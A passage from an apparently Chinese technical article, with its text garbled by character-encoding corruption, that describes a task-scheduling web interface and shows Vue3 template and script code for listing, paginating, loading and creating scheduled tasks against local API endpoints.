<p><strong>åŠŸèƒ½</strong>ï¼šæä¾›ä»»åŠ¡çš„æ–°å¢ã€ç¼–è¾‘ã€åˆ é™¤ã€å¯åŠ¨/ç»ˆæ­¢ã€æš‚åœ/ç»§ç»­ç­‰æ“ä½œ</p>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p>
<ul>
<li>æ–°å¢ä»»åŠ¡è¡¨å•</li>
<li>ä»»åŠ¡ç±»å‹åˆ‡æ¢ï¼ˆä¸€æ¬¡æ€§/å‘¨æœŸæ€§ï¼‰</li>
<li>Cronè¡¨è¾¾å¼é…ç½®</li>
<li>ä»»åŠ¡çŠ¶æ€ç®¡ç†</li>
</ul>
<h5 data-id="heading-29">1.3 ä»»åŠ¡ç»Ÿè®¡åˆ†æ</h5>
<p><strong>åŠŸèƒ½</strong>ï¼šæä¾›ä»»åŠ¡æ‰§è¡Œç»Ÿè®¡å’Œåˆ†æå›¾è¡¨</p>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p>
<ul>
<li>ä»»åŠ¡æ‰§è¡Œè¶‹åŠ¿å›¾</li>
<li>ä»»åŠ¡çŠ¶æ€åˆ†å¸ƒå›¾</li>
<li>ä»»åŠ¡ç±»å‹åˆ†å¸ƒå›¾</li>
<li>ä»»åŠ¡æ‰§è¡Œæ—¶é•¿åˆ†æ</li>
<li>é«˜é¢‘æ‰§è¡Œä»»åŠ¡åˆ—è¡¨</li>
</ul>
<h5 data-id="heading-30">1.4 ä»»åŠ¡æ—¥å¿—æŸ¥è¯¢</h5>
<p><strong>åŠŸèƒ½</strong>ï¼šæŸ¥è¯¢å’Œæ˜¾ç¤ºä»»åŠ¡çš„æ‰§è¡Œæ—¥å¿—</p>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p>
<ul>
<li>æŒ‰ä»»åŠ¡IDæŸ¥è¯¢æ—¥å¿—</li>
<li>æ—¥å¿—åˆ†é¡µæ˜¾ç¤º</li>
<li>æ‰§è¡ŒçŠ¶æ€å’Œæ—¶é—´æ˜¾ç¤º</li>
</ul>
<h4 data-id="heading-31">2. æ ¸å¿ƒæºä»£ç </h4>
<h5 data-id="heading-32">2.1 ä»»åŠ¡åˆ—è¡¨æ¸²æŸ“ (<code>template/index.html</code>)</h5>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- ä»»åŠ¡åˆ—è¡¨ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"activeTab === 'tasks'"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"task-list"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"task-table"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>åºå·<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>ä»»åŠ¡ID<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>ä»»åŠ¡åç§°<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>ä»»åŠ¡ç±»å‹<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>æ‰§è¡Œé—´éš”<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>æ‰§è¡Œæ¬¡æ•°<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>æ‰§è¡Œç»“æœ<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>æ“ä½œ<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"tasks.length === 0"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">"8"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center; color: #666; padding: 20px;"</span>&gt;</span>æš‚æ— ä»»åŠ¡<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(task, index) in paginatedTasks"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"task.id"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{{ (tasksPage - 1) * tasksPageSize + index + 1 }}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{{ task.id }}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{{ task.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{{ task.type === 'single' ? 'ä¸€æ¬¡æ€§' : 'å‘¨æœŸæ€§' }}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"task.type === 'single'"</span>&gt;</span> {{ formatDateTime(task.execute_at) }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-else</span>&gt;</span>{{ getCronInterval(task.cron_expr) }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{{ task.execute_count }}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"task.status === 'completed'"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"task.type === 'single' &amp;&amp; new Date(task.execute_at) &lt; new Date()"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"error-result"</span>&gt;</span>ä»»åŠ¡å·²è¶…æœŸ<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"allTaskLogs.find(log =&gt; log.task_id === task.id)?.status === 'success' ? 'success-result' : 'error-result'&gt;
                                {{ allTaskLogs.find(log =&gt; log.task_id === task.id)?.status === 'success' ? 'ä»»åŠ¡æ‰§è¡Œå®Œæˆ' : 'å¤±è´¥' }}
                            &lt;/span&gt;
                        &lt;/span&gt;
                    &lt;/td&gt;
                    &lt;td&gt;
                        &lt;div class="</span><span class="hljs-attr">action-buttons</span>"&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"['task-status', `status-${task.status}`, task.status !== 'running' &amp;&amp; task.type === 'single' &amp;&amp; new Date(task.execute_at) &lt; new Date() ? 'status-overdue' : '']"</span>&gt;</span>
                                {{ task.status === 'pending' ? 'ç­‰å¾…æ‰§è¡Œ' : task.status === 'running' ? 'æ­£åœ¨æ‰§è¡Œ' : task.type === 'single' &amp;&amp; new Date(task.execute_at) &lt; new Date() ? 'å·²è¶…æœŸ' : 'å·²å®Œæˆ' }}
                            <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"['btn', task.enabled_status ? 'btn-danger' : 'btn-success']"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"toggleTaskStatus(task.id, task.enabled_status)"</span>&gt;</span>
                                {{ task.enabled_status ? 'ç»ˆæ­¢' : 'å¯åŠ¨' }}
                            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"['btn', task.paused_status ? 'btn-warning' : 'btn-primary']"</span> <span class="hljs-attr">:disabled</span>=<span class="hljs-string">"!task.enabled_status"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"toggleTaskPause(task.id, task.paused_status)"</span>&gt;</span>
                                {{ task.paused_status ? 'ç»§ç»­' : 'æš‚åœ' }}
                            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"showTaskLogs(task.id)"</span>&gt;</span>æŸ¥çœ‹æ—¥å¿—<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-warning"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"editTask(task)"</span>&gt;</span>ä¿®æ”¹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-danger"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"deleteTask(task.id)"</span>&gt;</span>åˆ é™¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"pagination"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"tasksTotal &gt; tasksPageSize"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"tasksPage &gt; 1"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"tasksPage--"</span>&gt;</span>ä¸Šä¸€é¡µ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"page in tasksDisplayedPages"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"page"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ active: page === tasksPage }"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"tasksPage = page"</span>&gt;</span>{{ page }}<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-item"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"tasksPage &lt; tasksTotalPages"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"page-link"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"tasksPage++"</span>&gt;</span>ä¸‹ä¸€é¡µ<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h5 data-id="heading-33">2.2 Vue3 æ•°æ®ç®¡ç†å’Œæ–¹æ³• (<code>template/index.html</code>)</h5>
<pre><code class="hljs language-javascript" lang="javascript">&lt;script&gt;
    <span class="hljs-keyword">const</span> { createApp, ref, computed, onMounted, watch } = <span class="hljs-title class_">Vue</span>;

    <span class="hljs-title function_">createApp</span>({
        <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
            <span class="hljs-comment">// çŠ¶æ€ç®¡ç†</span>
            <span class="hljs-keyword">const</span> activeTab = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'tasks'</span>);
            <span class="hljs-keyword">const</span> tasks = <span class="hljs-title function_">ref</span>([]);
            <span class="hljs-keyword">const</span> taskLogs = <span class="hljs-title function_">ref</span>([]);
            <span class="hljs-keyword">const</span> allTaskLogs = <span class="hljs-title function_">ref</span>([]);
            <span class="hljs-keyword">const</span> taskFuncs = <span class="hljs-title function_">ref</span>([]);
            <span class="hljs-keyword">const</span> statistics = <span class="hljs-title function_">ref</span>({});
            <span class="hljs-keyword">const</span> failedTasks = <span class="hljs-title function_">ref</span>([]);
            <span class="hljs-keyword">const</span> frequentTasks = <span class="hljs-title function_">ref</span>([]);
            <span class="hljs-keyword">const</span> cronExpressions = <span class="hljs-title function_">ref</span>([]);

            <span class="hljs-comment">// åˆ†é¡µç®¡ç†</span>
            <span class="hljs-keyword">const</span> tasksPage = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> tasksPageSize = <span class="hljs-title function_">ref</span>(<span class="hljs-number">10</span>);
            <span class="hljs-keyword">const</span> tasksTotal = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">const</span> cronPage = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>);
            <span class="hljs-keyword">const</span> cronPageSize = <span class="hljs-title function_">ref</span>(<span class="hljs-number">10</span>);
            <span class="hljs-keyword">const</span> cronTotal = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);

            <span class="hljs-comment">// æ’åºç®¡ç†</span>
            <span class="hljs-keyword">const</span> sortBy = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'default'</span>);
            <span class="hljs-keyword">const</span> sortOrder = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'asc'</span>);

            <span class="hljs-comment">// æ¨¡æ€æ¡†ç®¡ç†</span>
            <span class="hljs-keyword">const</span> showAddTaskModal = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);
            <span class="hljs-keyword">const</span> showEditTaskModal = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);
            <span class="hljs-keyword">const</span> showLogsModal = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);
            <span class="hljs-keyword">const</span> showCronModal = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>);

            <span class="hljs-comment">// ä»»åŠ¡è¡¨å•</span>
            <span class="hljs-keyword">const</span> newTask = <span class="hljs-title function_">ref</span>({
                <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>,
                <span class="hljs-attr">description</span>: <span class="hljs-string">''</span>,
                <span class="hljs-attr">type</span>: <span class="hljs-string">'single'</span>,
                <span class="hljs-attr">cron_expr</span>: <span class="hljs-string">''</span>,
                <span class="hljs-attr">execute_at</span>: <span class="hljs-string">''</span>,
                <span class="hljs-attr">timeout</span>: <span class="hljs-number">30</span>,
                <span class="hljs-attr">task_func_name</span>: <span class="hljs-string">''</span>,
                <span class="hljs-attr">params</span>: <span class="hljs-string">''</span>
            });

            <span class="hljs-keyword">const</span> editingTask = <span class="hljs-title function_">ref</span>({});
            <span class="hljs-keyword">const</span> editingCron = <span class="hljs-title function_">ref</span>({});

            <span class="hljs-comment">// ä»»åŠ¡ä¿¡æ¯</span>
            <span class="hljs-keyword">const</span> taskName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
            <span class="hljs-keyword">const</span> taskFuncName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
            <span class="hljs-keyword">const</span> taskFuncDesc = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);

            <span class="hljs-comment">// å¸¸ç”¨Cronè¡¨è¾¾å¼</span>
            <span class="hljs-keyword">const</span> commonCronExpressions = [
                { <span class="hljs-attr">label</span>: <span class="hljs-string">'æ¯10ç§’'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'*/10 * * * * *'</span> },
                { <span class="hljs-attr">label</span>: <span class="hljs-string">'æ¯åˆ†é’Ÿ'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'0 * * * * *'</span> },
                { <span class="hljs-attr">label</span>: <span class="hljs-string">'æ¯5åˆ†é’Ÿ'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'0 */5 * * * *'</span> },
                { <span class="hljs-attr">label</span>: <span class="hljs-string">'æ¯å°æ—¶'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'0 0 * * * *'</span> },
                { <span class="hljs-attr">label</span>: <span class="hljs-string">'æ¯å¤©'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'0 0 0 * * *'</span> },
                { <span class="hljs-attr">label</span>: <span class="hljs-string">'æ¯å‘¨'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'0 0 0 * * 0'</span> },
                { <span class="hljs-attr">label</span>: <span class="hljs-string">'æ¯æœˆ'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'0 0 0 1 * *'</span> }
            ];

            <span class="hljs-comment">// åŠ è½½ä»»åŠ¡åˆ—è¡¨</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadTasks</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/tasks'</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        tasks.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>;
                        tasksTotal.<span class="hljs-property">value</span> = tasks.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>;
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'åŠ è½½ä»»åŠ¡åˆ—è¡¨å¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'åŠ è½½ä»»åŠ¡åˆ—è¡¨å¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½ä»»åŠ¡åˆ—è¡¨å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// åŠ è½½æ‰€æœ‰ä»»åŠ¡æ—¥å¿—</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadAllTaskLogs</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/tasks/logs/all'</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        allTaskLogs.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>;
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½ä»»åŠ¡æ—¥å¿—å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// åŠ è½½ä»»åŠ¡å‡½æ•°</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadTaskFuncs</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/tasks/funcs'</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        taskFuncs.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>;
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½ä»»åŠ¡å‡½æ•°å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// åŠ è½½ç»Ÿè®¡æ•°æ®</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadStatistics</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/tasks/statistics'</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        statistics.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>;
                        <span class="hljs-title function_">initCharts</span>();
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½ç»Ÿè®¡æ•°æ®å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// åŠ è½½å¤±è´¥ä»»åŠ¡</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadFailedTasks</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/tasks/failed'</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        failedTasks.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>;
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½å¤±è´¥ä»»åŠ¡å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// åŠ è½½é«˜é¢‘ä»»åŠ¡</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadFrequentTasks</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/tasks/frequent'</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        frequentTasks.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>;
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½é«˜é¢‘ä»»åŠ¡å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// åŠ è½½Cronè¡¨è¾¾å¼</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadCronExpressions</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/tasks/cron'</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        cronExpressions.<span class="hljs-property">value</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>;
                        cronTotal.<span class="hljs-property">value</span> = cronExpressions.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>;
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½Cronè¡¨è¾¾å¼å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// æ–°å¢ä»»åŠ¡</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">addTask</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// è½¬æ¢æ—¥æœŸæ ¼å¼</span>
                    <span class="hljs-keyword">if</span> (newTask.<span class="hljs-property">value</span>.<span class="hljs-property">type</span> === <span class="hljs-string">'single'</span>) {
                        newTask.<span class="hljs-property">value</span>.<span class="hljs-property">execute_at</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(newTask.<span class="hljs-property">value</span>.<span class="hljs-property">execute_at</span>).<span class="hljs-title function_">toISOString</span>();
                    }

                    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/tasks'</span>, newTask.<span class="hljs-property">value</span>);
                    <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡åˆ›å»ºæˆåŠŸ'</span>, <span class="hljs-string">'success'</span>);
                        showAddTaskModal.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
                        <span class="hljs-title function_">resetNewTask</span>();
                        <span class="hljs-title function_">loadTasks</span>();
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡åˆ›å»ºå¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                    }
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ä»»åŠ¡åˆ›å»ºå¤±è´¥'</span>, <span class="hljs-string">'error'</span>);
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åˆ›å»ºä»»åŠ¡å¤±è´¥:'</span>, error);
                }
            };

            <span class="hljs-comment">// é‡ç½®æ–°å¢ä»»åŠ¡è¡¨å•</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">resetNewTask</span> = (<span class="hljs-params"/>) =&gt; {
                newTask.<span class="hljs-property">value</span> = {
                    <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>,
                    <span class="hljs-attr">description</span>: <span class="hljs-string">''</span>,
                    <span class="hljs-attr">type</span>: <span class="hljs-string">'single'</span>,
                    <span class="hljs-attr">cron_expr</span>: <span class="hljs-string">''</span>,
                    <span class="hljs-attr">execute_at</span>: <span class="hljs-string">''</span>,
                    <span class="hljs-attr">timeout</span>: <span class="hljs-number">30</span>,
                    <span class="hljs-attr">task_func_name</span>: <span class="hljs-string">''</span>,
                    <span class="hljs-attr">params</span>: <span class="hljs-string">''</span>
                };
            };

            <span class="hljs-comment">// ç¼–è¾‘ä»»åŠ¡</span>
